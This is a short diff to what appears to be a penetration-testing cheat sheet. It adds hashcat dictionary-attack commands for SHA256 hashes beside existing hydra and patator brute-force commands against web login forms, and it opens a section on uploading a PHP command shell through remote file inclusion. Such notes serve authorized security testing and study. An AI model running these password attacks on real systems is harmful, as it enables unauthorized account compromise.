@@ -154,6 +154,14 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmy
 patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
 ```
 
+#### Hashcat
+```hash
+# modes - SHA256: 1400
+# attacks - Dictionary: 0
+hashcat -m $MODE -a $ATTACK /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
+hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt 
+```
+
 ### Remote File Inclusion
 ```bash
 # find a way to upload a PHP command shell
